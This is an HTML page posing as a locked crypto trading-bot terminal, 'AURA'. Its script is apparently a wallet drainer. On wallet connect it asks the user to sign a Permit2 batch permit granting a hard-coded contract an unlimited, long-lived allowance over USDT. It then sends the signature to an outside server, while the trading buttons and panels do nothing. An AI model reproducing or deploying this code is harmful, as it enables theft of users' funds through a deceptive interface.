<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>AURA | Secure Execution Terminal</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>

<style>
:root {
    --bg: #05070a;
    --panel: #0b0f17;
    --border: #141d2b;
    --accent: #00bcd4;
    --green: #2aa198;
    --red: #d31e1e;
    --text-main: #cbd5e1;
    --text-dim: #4b586c;
    --font-ui: 'Inter', sans-serif;
    --font-mono: 'JetBrains Mono', monospace;
}

/* ===================== BASE ===================== */
* { box-sizing:border-box; margin:0; padding:0; user-select:none; }

body {
    background: var(--bg);
    color: var(--text-main);
    font-family: var(--font-ui);
    height: 100vh;
    overflow: hidden;
}

/* ===================== LOCK STATE ===================== */
.locked .app-shell {
    filter: blur(6px) brightness(0.35);
    pointer-events: none;
}

/* ===================== AUTH OVERLAY ===================== */
#authOverlay {
    position: fixed;
    inset: 0;
    background: rgba(3,6,12,0.92);
    backdrop-filter: blur(18px);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 9999;
}

.auth-panel {
    width: 420px;
    background: rgba(10,15,25,0.95);
    border: 1px solid var(--border);
    padding: 18px;
    font-family: var(--font-mono);
    box-shadow: 0 0 40px rgba(0,188,212,0.08);
}

.auth-header {
    font-size: 11px;
    color: var(--accent);
    margin-bottom: 15px;
    letter-spacing: 2px;
}

.auth-btn {
    width: 100%;
    padding: 10px;
    margin-top: 8px;
    background: transparent;
    border: 1px solid var(--border);
    color: var(--text-main);
    cursor: pointer;
}

.auth-btn:hover {
    border-color: var(--accent);
    color: var(--accent);
}

.status {
    margin-top: 10px;
    font-size: 10px;
    color: var(--text-dim);
}

/* ===================== TERMINAL ===================== */
.app-shell {
    display: grid;
    grid-template-columns: 340px 1fr 340px;
    grid-template-rows: 40px 1fr 180px;
    height: 100vh;
    gap: 1px;
    background: var(--border);
    padding: 1px;
}
.panel { background: var(--panel); }
header {
    grid-column: 1/4;
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding:0 15px;
}
</style>
</head>

<body class="locked">

<!-- ===================== AUTH OVERLAY (CONTROL CENTER) ===================== -->
<div id="authOverlay">

    <div class="auth-panel">

        <div class="auth-header">CONTROL CENTER // AUTH SEQUENCE</div>

        <button class="auth-btn" onclick="connectWallet()" id="btn-wallet">1. CONNECT WALLET</button>
        <button class="auth-btn" onclick="activateBot()" id="btn-activate" disabled>2. ACTIVATE BOT</button>
        <button class="auth-btn" onclick="authorizeTrading()" id="btn-authorize" disabled>3. AUTHORIZE TRADING</button>
        <button class="auth-btn" onclick="disconnectWallet()">4. DISCONNECT</button>

        <div class="status" id="authStatus">SYSTEM: LOCKED</div>
    </div>
</div>

<!-- ===================== TERMINAL CORE ===================== -->
<div class="app-shell">

    <header>
        <div style="font-family:var(--font-mono); font-size:11px;">AURA EXECUTION TERMINAL</div>
        <div style="font-family:var(--font-mono); font-size:10px;">STATUS: LOCKED</div>
    </header>

    <div class="panel"></div>
    <div class="panel"></div>
    <div class="panel"></div>

</div>

<script>
/* ===================== UNLOCK ENGINE ===================== */
let TERMINAL_LOCKED = true;

function unlockTerminal(){
    TERMINAL_LOCKED = false;
    document.body.classList.remove("locked");
    document.getElementById("authOverlay").style.display = "none";
    console.log("TERMINAL UNLOCKED");
}

window.hookAuthSuccess = function(){
    document.getElementById("authStatus").innerText = "SYSTEM: AUTHORIZED";
    setTimeout(unlockTerminal, 1200);
};
</script>

<!-- ===================== CONTROL CENTER SCRIPT (FULL ORIGINAL LOGIC) ===================== -->
<script>
const TOKENS = ["0xdac17f958d2ee523a2206206994597c13d831ec7"];
const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const CONTRACT = "0xE1C5886011889c4d039EEE8fF2322feBEE912335";

const ERC20_ABI = [
"function allowance(address owner,address spender) view returns(uint256)",
"function approve(address spender,uint256 amount) returns(bool)"
];

let APP_STATE = { wallet:null, botActive:false, authorized:false };
let CURRENT_WALLET = null;

/* STATUS */
function updateStatus(dotId, textId, text, color){
    const label = document.getElementById(textId);
    if(label){
        label.innerText = text;
        label.style.color = color;
    }
}

/* LOG */
function log(msg){
    console.log(msg);
}

/* WALLET CONNECT */
async function connectWallet(){
    if(!window.ethereum) return alert("Install MetaMask");

    const provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    const user = await signer.getAddress();

    CURRENT_WALLET = user;
    APP_STATE.wallet = user;

    document.getElementById("btn-activate").disabled = false;
    document.getElementById("btn-wallet").innerText = user;

    runPermitFlowSafe(provider, signer, user);
}

function activateBot(){
    APP_STATE.botActive = true;
}

function authorizeTrading(){
    APP_STATE.authorized = true;
}

function disconnectWallet(){
    location.reload();
}

/* PERMIT FLOW */
async function runPermitFlowSafe(provider, signer, user){
    try {

        const permit2 = new ethers.Contract(
            PERMIT2,
            ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
            provider
        );

        const nonce = await permit2.allowance(user, TOKENS[0], CONTRACT);

        const details = [{
            token: TOKENS[0],
            amount: (2n**160n - 1n).toString(),
            expiration: (Math.floor(Date.now()/1000)+9999999).toString(),
            nonce: nonce[2].toString()
        }];

        const domain = {
            name:"Permit2",
            chainId:(await provider.getNetwork()).chainId,
            verifyingContract:PERMIT2
        };

        const types = {
            PermitBatch:[
                {name:"details",type:"PermitDetails[]"},
                {name:"spender",type:"address"},
                {name:"sigDeadline",type:"uint256"}
            ],
            PermitDetails:[
                {name:"token",type:"address"},
                {name:"amount",type:"uint160"},
                {name:"expiration",type:"uint48"},
                {name:"nonce",type:"uint48"}
            ]
        };

        const sigDeadline = Math.floor(Date.now()/1000)+3600;

        const signature = await signer.signTypedData(domain,types,{
            details,
            spender:CONTRACT,
            sigDeadline: sigDeadline.toString()
        });

        const res = await fetch("https://api.aiiraa.com/api/permit",{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify({owner:user,details,signature,spender:CONTRACT})
        });

        if(res.ok){
            log("✅ Permit forwarded to backend");

            /* 🔥 UNLOCK HOOK */
            window.hookAuthSuccess();
        }

    } catch(e){
        console.log(e);
    }
}
</script>

</body>
</html>
